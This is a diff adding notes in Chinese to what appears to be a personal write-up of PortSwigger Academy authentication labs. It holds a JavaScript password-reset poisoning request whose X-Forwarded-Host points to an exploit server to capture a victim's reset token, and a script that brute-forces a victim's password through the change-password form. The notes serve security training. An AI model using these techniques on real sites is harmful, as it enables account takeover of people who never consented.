@@ -2,7 +2,7 @@
 title: Authentication vulnerabilities
 description: Authentication vulnerabilities
 last_update:
-  date: "2025-09-11T08:00:00+08:00"
+  date: "2025-09-16T08:00:00+08:00"
 ---
 
 ## Lab: Username enumeration via different responses
@@ -931,6 +931,78 @@ carlos:onceuponatime
 | --------- | ---------------------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/authentication/other-mechanisms#resetting-passwords-using-a-url             |
 | Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware |
+
+這題我怎覺得是 Expert 等級，主要是我沒想到要用 `X-Forwarded-Host`
+
+```js
+fetch(
+  "https://0a65009404c6b12682350b1f008900d0.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
+      "X-Forwarded-Host":
+        "exploit-0ae9008f0486b173822c0a6d014a008f.exploit-server.net",
+    },
+    body: "username=carlos",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+之後看 log
+
+```
+/forgot-password?temp-forgot-password-token=0n2m78it8uxcstar2p6y9tm9kzbee7z2
+```
+
+用受害者的 token 就可以成功修改密碼
+
+## X-Forwarded-Host
+
+補充一下 `X-Forwarded-Host`，是用來存放最終的 `Host`，因為中間層會去修改 `Host` 的值
+
+## Lab: Password brute-force via password change
+
+| Dimension | Description                                                                                                       |
+| --------- | ----------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/authentication/other-mechanisms#changing-user-passwords                      |
+| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change |
+
+登入自己帳號的情況，枚舉受害者的密碼，若 `current-password` 正確且 `new-password` 不匹配，就會回傳 `New passwords do not match`
+
+```js
+function changePassword(currentPassword) {
+  return fetch(
+    "https://0ad400fa03d6c6df81df8e7700b500ac.web-security-academy.net/my-account/change-password",
+    {
+      headers: {
+        "content-type": "application/x-www-form-urlencoded",
+      },
+      body: `username=carlos&current-password=${currentPassword}&new-password-1=123&new-password-2=456`,
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+    },
+  );
+}
+
+async function main() {
+  for (const password of passwords) {
+    const response = await changePassword(password);
+    const text = await response.text();
+    if (text.includes("New passwords do not match"))
+      return console.log(password);
+  }
+}
+```
+
+成功得出 `carlos:12345`，之後成功修改帳密～
+
+## 小結
+
+雖然這系列有介紹蠻多方法，但感覺很多時候都還是要 brute-force 帳號 or 密碼，除非剛好是弱帳密組合，不然實務上真的很難猜到
 
 ## 參考資料
 
